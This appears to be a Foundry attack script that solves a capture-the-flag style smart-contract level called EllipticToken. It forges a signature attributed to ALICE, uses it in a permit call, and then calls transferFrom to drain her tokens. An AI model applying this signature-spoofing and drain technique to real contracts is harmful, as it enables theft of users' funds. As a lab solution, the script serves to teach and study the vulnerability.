// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import "forge-std/Script.sol";
import "src/levels/EllipticToken/EllipticToken.sol";

contract EllipticTokenAttackScript is Script {

    uint256 INITIAL_AMOUNT = 10 ether;
    address ALICE = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;

    function setUp() public {}

    function run() public {
        EllipticToken target = EllipticToken(0x0000000000000000000000000000000000000000); // Insert target target address

        vm.startBroadcast();
        // Spoofed signature generated with EllipticToken.py script
        bytes32 r = 0x3a428e988a210ac89b262b44521f3192f1e6309be49b61ccbb22106267f31afc;
        bytes32 s = 0x35d83f57c65d93f446ec3c3329c8040e249dd230bbf28b8dd49d4cd6fe41fa71;
        uint8 v = 27;
        uint256 amount = uint256(0x4e8b732ad1e24ccd3af726f07ef93f9650b4ea124833e40fb0ab3f72f942e12b);
        bytes memory aliceSpoofedSignature = abi.encodePacked(r, s, v);

        // Permit acceptance signature
        bytes32 permitAcceptHash = keccak256(abi.encodePacked(ALICE, msg.sender, amount));
        (v, r, s) = vm.sign(vm.envUint("PRIVATE_KEY"), permitAcceptHash);
        bytes memory playerPermitAcceptanceSignature = abi.encodePacked(r, s, v);

        // Call permit to approve the transfer
        target.permit(amount, msg.sender, aliceSpoofedSignature, playerPermitAcceptanceSignature);

        // Drain the funds
        target.transferFrom(ALICE, msg.sender, INITIAL_AMOUNT);
        vm.stopBroadcast();
    }
}
